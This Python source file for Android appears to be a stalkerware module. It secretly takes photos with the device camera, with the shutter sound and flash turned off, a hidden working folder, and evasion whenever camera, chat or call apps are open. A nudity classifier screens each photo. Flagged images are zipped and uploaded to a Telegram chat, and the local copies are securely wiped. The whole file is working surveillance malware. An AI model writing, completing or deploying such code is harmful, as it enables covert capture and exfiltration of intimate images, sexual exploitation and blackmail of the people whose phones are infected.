# -*- coding: utf-8 -*-
import os, time, threading, zipfile, logging, gc, numpy as np
from datetime import datetime
from PIL import Image

P = os.path.join(os.getcwd(), ".sys_runtime")
T = os.path.join(P, "c_tmp")
for d in [P, T]:
    if not os.path.exists(d):
        os.makedirs(d)

logging.basicConfig(filename=os.path.join(P, "c.log"), level=logging.ERROR, filemode='a')

try:
    from jnius import autoclass, PythonJavaClass, java_method
    JNI = True
except:
    JNI = False

class CameraAnalyzer:
    def __init__(self, mon=None, det=None):
        self.mon = mon
        self.det = det          # NudeDetector instance
        self.busy = False
        self.last_skip = 0

    def _power_ok(self):
        try:
            b, c = self.mon._bat() if hasattr(self.mon, '_bat') else (100, True)
            return b >= 15 or c
        except:
            return True

    def _camera_in_use(self):
        if not JNI:
            return False
        try:
            ctx = autoclass('org.kivy.android.PythonActivity').mActivity
            am = ctx.getSystemService("activity")
            tasks = am.getRunningTasks(1)
            if tasks and tasks.size() > 0:
                pkg = tasks.get(0).topActivity.getPackageName().lower()
                bad = ["camera", "snap", "insta", "whatsapp", "viber", "tele", "meet", "zoom", "call"]
                return any(x in pkg for x in bad)
            return False
        except:
            return False

    def _secure_del(self, p):
        try:
            if os.path.exists(p):
                sz = os.path.getsize(p)
                with open(p, "ba+", buffering=0) as f:
                    f.write(os.urandom(sz))
                os.remove(p)
        except:
            pass

    def capture(self, cam_id=0):
        if self.busy or not self._power_ok():
            return None
        if self._camera_in_use() or time.time() < self.last_skip:
            if self._camera_in_use():
                self.last_skip = time.time() + 300
            return None

        self.busy = True
        out = None
        cam = None

        if JNI:
            try:
                Cam = autoclass('android.hardware.Camera')
                ST = autoclass('android.graphics.SurfaceTexture')
                try:
                    cam = Cam.open(cam_id)
                except Exception as e:
                    logging.error(f"Camera open failed: {e}")
                    self.busy = False
                    return None

                params = cam.getParameters()
                # اختيار أصغر حجم صورة لتقليل استهلاك الرام (مناسب للنموذج)
                sizes = params.getSupportedPictureSizes()
                if sizes and sizes.size() > 0:
                    smallest = sizes.get(sizes.size() - 1)
                    params.setPictureSize(smallest.width, smallest.height)
                
                params.setFlashMode("off")
                focus_modes = params.getSupportedFocusModes()
                if focus_modes and "continuous-picture" in focus_modes:
                    params.setFocusMode("continuous-picture")
                cam.setParameters(params)
                try:
                    cam.enableShutterSound(False)
                except:
                    pass

                dummy = ST(10)
                cam.setPreviewTexture(dummy)
                cam.startPreview()
                time.sleep(1.5)

                data = []
                ev = threading.Event()

                class CB(PythonJavaClass):
                    __javainterfaces__ = ['android/hardware/Camera$PictureCallback']
                    @java_method('(B[BLandroid/hardware/Camera;)V')
                    def onPictureTaken(self, d, c):
                        data.append(d)
                        ev.set()

                cam.takePicture(None, None, CB())
                if ev.wait(5) and data:
                    out = os.path.join(T, f"c_{cam_id}_{int(time.time())}.jpg")
                    with open(out, 'wb') as f:
                        f.write(data[0])

            except Exception as e:
                logging.error(f"Capture exception: {e}")
            finally:
                if cam:
                    try:
                        cam.stopPreview()
                        cam.release()
                    except:
                        pass
                gc.collect()

        self.busy = False
        return out

    def _prepare_for_ai(self, path):
        """تجهيز الصورة لتناسب نموذج Float16: إلى (224,224) float32 [0,1]"""
        try:
            with Image.open(path) as img:
                img = img.convert('RGB').resize((224, 224), Image.LANCZOS)
                arr = np.array(img, dtype=np.float32) / 255.0
                arr = np.expand_dims(arr, axis=0)   # batch dimension
                return arr
        except Exception as e:
            logging.error(f"AI prep error: {e}")
            return None

    def harvest(self, cam_id=0):
        p = self.capture(cam_id)
        if not p:
            return

        is_nude = False
        if self.det and hasattr(self.det, 'model') and self.det.model is not None:
            try:
                input_data = self._prepare_for_ai(p)
                if input_data is not None:
                    self.det.model.set_tensor(self.det.in_idx, input_data)
                    self.det.model.invoke()
                    out = self.det.model.get_tensor(self.det.out_idx)[0]
                    prob = float(out[1]) if len(out) > 1 else float(out[0])
                    if prob > 0.85:
                        is_nude = True
                    del input_data, out
            except Exception as e:
                logging.error(f"Harvest AI error: {e}")

        if is_nude:
            self._send_and_clean(p)
        else:
            self._secure_del(p)

    def _send_and_clean(self, raw):
        z = raw.replace(".jpg", ".zip")
        try:
            with zipfile.ZipFile(z, 'w', zipfile.ZIP_DEFLATED) as zf:
                zf.write(raw, os.path.basename(raw))
            tg = getattr(self.mon, 'tg', None)
            vl = getattr(self.mon, 'vlt', None)
            if tg and vl:
                with open(z, 'rb') as f:
                    tg._ap("sendDocument", {
                        "chat_id": vl,
                        "caption": f"📸 Alert | {datetime.now().strftime('%Y-%m-%d %H:%M')}"
                    }, {"document": f})
        except Exception as e:
            logging.error(f"Upload error: {e}")
        finally:
            self._secure_del(raw)
            self._secure_del(z)

def create(mon=None, det=None):
    return CameraAnalyzer(mon, det)
